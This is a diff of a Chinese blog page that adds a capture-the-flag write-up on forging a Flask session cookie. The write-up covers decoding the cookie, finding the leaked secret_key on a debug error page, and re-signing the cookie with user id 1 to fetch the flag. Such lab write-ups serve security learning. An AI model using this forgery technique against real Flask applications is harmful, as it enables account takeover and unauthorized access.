@@ -68,7 +68,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask-jwt"><span class="toc-text">flask?jwt?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-factors"><span class="toc-text">ez_factors</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask-jwt"><span class="toc-text">flask?jwt?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask-jwt-hard"><span class="toc-text">flask?jwt?(hard)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-factors"><span class="toc-text">ez_factors</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -227,7 +227,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">832字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -236,7 +236,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">3分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
     
@@ -281,6 +281,30 @@
 <p><img src="/blog/2023/06/04/NSSCTF-ROUND-13-%E5%A4%8D%E7%8E%B0/image-20230616002046193.png" alt="image-20230616002046193"></p>
 <p>带着session值来到<code>/getFlag</code>路由获取flag</p>
 <p><img src="/blog/2023/06/04/NSSCTF-ROUND-13-%E5%A4%8D%E7%8E%B0/image-20230616002403551.png" alt="image-20230616002403551"></p>
+<hr>
+<h1 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h1><blockquote>
+<p>session伪造</p>
+</blockquote>
+<p>和第一题一样是session伪造，但是密钥不在<code>/changePassword</code>路由下了</p>
+<p>我们先注册个号登录看看，f12发现hint</p>
+<p><img src="/blog/2023/06/04/NSSCTF-ROUND-13-%E5%A4%8D%E7%8E%B0/image-20230712163122437.png" alt="image-20230712163122437"></p>
+<p>访问&#x2F;wor</p>
+<p>返回<code>哼，我不会告诉你我藏哪里了，但是不能什么都不跟你说吧？哎，告诉你上次的登录时间吧: 2023-07-12 08:29:55+00:00</code></p>
+<p>拿到现在的session并丢进脚本解密</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py decode <span class="token parameter variable">-c</span> .eJwlzrFqQzEMheFXMZozSLKta_kFCoFuhY5BtmUSSJeb3Cnk3evS8Ry-4X_BZe7-uEJ97oef4HIbUGFE0cFGs5WufaYiqWNmyd3IKJtv2PJmU6UspFNyi32SjkIjZXaTEqdtjUxLYvMk2ZaS1grJwKgofVFBHYQeXWNB7dF9ynC1DivkePj-X8NrPm8_DvUF4e_49nEKxOF83AMjx4Clstacw8fnF7zfv5XkO1Y.ZK5kgw.BFaeOd4JTpB3UNKs3dkZp_Ia-G4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到结果</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json">b'<span class="token punctuation">&#123;</span><span class="token property">"_fresh"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token property">"_id"</span><span class="token operator">:</span><span class="token string">"d369d2a1fb8c9cf4864c05265ca1a15ae70b57af968a1f9f65b3cf19d81d452ea683fa7b1a9842ae465a9f66bb816d03906c81d609d10e3e93809c3eef6de9ac"</span><span class="token punctuation">,</span><span class="token property">"_user_id"</span><span class="token operator">:</span><span class="token string">"2"</span><span class="token punctuation">,</span><span class="token property">"time"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">" d"</span><span class="token operator">:</span><span class="token string">"Wed, 12 Jul 2023 08:29:55 GMT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来就是要找密钥了，但是上哪找呢？这个时候就要考虑看看还有没有什么遗漏的点，除去已知的几个页面，此时我们还有debug页面的信息没看</p>
+<p>因为session含有<code>time</code>属性，所以猜测这个时间是从session中读取，于是瞎改session弄出debug报错页面</p>
+<p><img src="/blog/2023/06/04/NSSCTF-ROUND-13-%E5%A4%8D%E7%8E%B0/image-20230712164510455.png" alt="image-20230712164510455"></p>
+<p>点开下面的注释，发现secret_key在这里，为<code>hardgam3_C0u1d_u_f1ndM3????</code></p>
+<p>带上secret_key把<code>_user_id</code>改为1，注意：这里外层要改为双引号包括里面改成单引号，true改为True不然会报错</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"hardgam3_C0u1d_u_f1ndM3????"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'fresh':True,'_id':'d369d2a1fb8c9cf4864c05265ca1a15ae70b57af968a1f9f65b3cf19d81d452ea683fa7b1a9842ae465a9f66bb816d03906c81d609d10e3e93809c3eef6de9ac','_user_id':'1','time':&#123;' d':'Wed, 12 Jul 2023 08:29:55 GMT'&#125;&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>带着session值访问&#x2F;getFlag即可获得flag</p>
+<p><img src="/blog/2023/06/04/NSSCTF-ROUND-13-%E5%A4%8D%E7%8E%B0/image-20230712171223964.png" alt="image-20230712171223964"></p>
 <hr>
 <h1 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h1><blockquote>
 <p>换行漏洞+编码读取文件</p>
